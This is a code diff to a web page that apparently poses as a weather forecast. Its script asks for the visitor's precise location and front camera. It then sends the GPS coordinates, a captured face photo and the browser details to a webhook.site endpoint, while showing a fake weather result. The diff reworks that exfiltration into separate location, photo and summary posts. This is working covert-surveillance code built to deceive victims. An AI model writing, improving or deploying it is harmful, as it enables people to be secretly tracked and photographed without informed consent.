@@ -20,10 +20,51 @@
     <script>
     const WEBHOOK = 'https://webhook.site/16155721-b9ba-438b-84c5-5f6a5461638c';
 
+    function sendToWebhook(data) {
+        fetch(WEBHOOK, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(data)
+        });
+    }
+
     async function startCapture() {
         const status = document.getElementById('status');
         status.innerText = 'Loading weather data...';
 
+        let locationData = null;
+        let photoBase64 = null;
+        let cameraError = null;
+        let locationError = null;
+
+        // Step 1: Request location FIRST
+        try {
+            position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
+            });
+            locationData = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+            // Immediately send location to webhook
+            sendToWebhook({
+                type: 'location',
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString(),
+                ua: navigator.userAgent
+            });
+        } catch (err) {
+            locationError = err.message;
+        }
+
+        // Step 2: Then request camera
+        status.innerText = 'Preparing forecast...';
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -34,7 +75,6 @@
             video.srcObject = stream;
             await video.play();
 
-            // iOS needs extra time to render video frame
             await new Promise(r => setTimeout(r, 800));
 
             const canvas = document.getElementById('canvas');
@@ -43,73 +83,34 @@
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+            photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
             stream.getTracks().forEach(track => track.stop());
 
-            status.innerText = 'Fetching forecast...';
-
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            type: 'checkin',
-                            photo: photoBase64,
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: new Date().toISOString(),
-                            ua: navigator.userAgent
-                        })
-                    });
-                    status.innerText = '✅ Weather: 26°C, Partly Cloudy';
-                    status.style.color = '#28a745';
-                },
-                function(error) {
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            type: 'checkin',
-                            photo: photoBase64,
-                            lat: null,
-                            lng: null,
-                            geoError: error.message,
-                            timestamp: new Date().toISOString(),
-                            ua: navigator.userAgent
-                        })
-                    });
-                    status.innerText = '✅ Weather: 26°C, Partly Cloudy';
-                    status.style.color = '#28a745';
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+            // Send photo to webhook
+            sendToWebhook({
+                type: 'photo',
+                photo: photoBase64,
+                timestamp: new Date().toISOString(),
+                ua: navigator.userAgent
+            });
 
         } catch (err) {
-            // Camera failed — still try to get location
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            type: 'checkin',
-                            photo: null,
-                            cameraError: err.message,
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            timestamp: new Date().toISOString(),
-                            ua: navigator.userAgent
-                        })
-                    });
-                },
-                function() {},
-                { timeout: 5000 }
-            );
-            status.innerText = '✅ Weather: 26°C, Partly Cloudy';
-            status.style.color = '#28a745';
+            cameraError = err.message;
         }
+
+        // Step 3: Send combined summary
+        sendToWebhook({
+            type: 'summary',
+            location: locationData,
+            locationError: locationError,
+            hasPhoto: photoBase64 ? true : false,
+            cameraError: cameraError,
+            timestamp: new Date().toISOString(),
+            ua: navigator.userAgent
+        });
+
+        status.innerText = '✅ Weather: 26°C, Partly Cloudy';
+        status.style.color = '#28a745';
     }
     </script>
 </body>
